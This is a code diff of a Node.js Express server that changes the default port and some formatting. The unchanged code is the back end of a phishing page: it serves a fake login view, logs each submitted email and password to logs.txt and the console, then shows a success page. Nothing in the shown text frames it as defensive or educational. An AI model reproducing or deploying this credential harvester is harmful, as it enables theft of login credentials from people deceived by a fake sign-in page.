@@ -5,7 +5,7 @@ const path = require('path');
 const fs = require('fs');
 const axios = require('axios');
 const os = require('os');
-var port = process.env.PORT || 1111;
+var port = process.env.PORT || 3000;
 var networkInterfaces = os.networkInterfaces();
 
 const app = express();
@@ -18,11 +18,11 @@ app.use(bodyParser.json());
 
 app.use('/images', express.static('images'));
 
-app.get('/', function (req, res) {
+app.get('/', function(req, res) {
     res.render('f_login');
 });
 
-app.post('/_', function (req, res) {
+app.post('/_', function(req, res) {
     res.render('f_success');
     var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`
     fs.appendFile('logs.txt', captured_content, err => {
@@ -34,19 +34,19 @@ app.post('/_', function (req, res) {
     console.log(captured_content);
 });
 
-app.get('/images/eye-off.png', function (req, res) {
+app.get('/images/eye-off.png', function(req, res) {
     res.sendFile(path.join(__dirname, './views/images/eye-off.png'))
 });
-app.get('/images/eye.png', function (req, res) {
+app.get('/images/eye.png', function(req, res) {
     res.sendFile(path.join(__dirname, './views/images/eye.png'))
 });
-app.get('/images/favicon.png', function (req, res) {
+app.get('/images/favicon.png', function(req, res) {
     res.sendFile(path.join(__dirname, './views/images/favicon.png'))
 });
-app.get('/images/logo.png', function (req, res) {
+app.get('/images/logo.png', function(req, res) {
     res.sendFile(path.join(__dirname, './views/images/logo.png'))
 });
-app.get('/images/check.png', function (req, res) {
+app.get('/images/check.png', function(req, res) {
     res.sendFile(path.join(__dirname, './views/images/check.png'))
 });
 
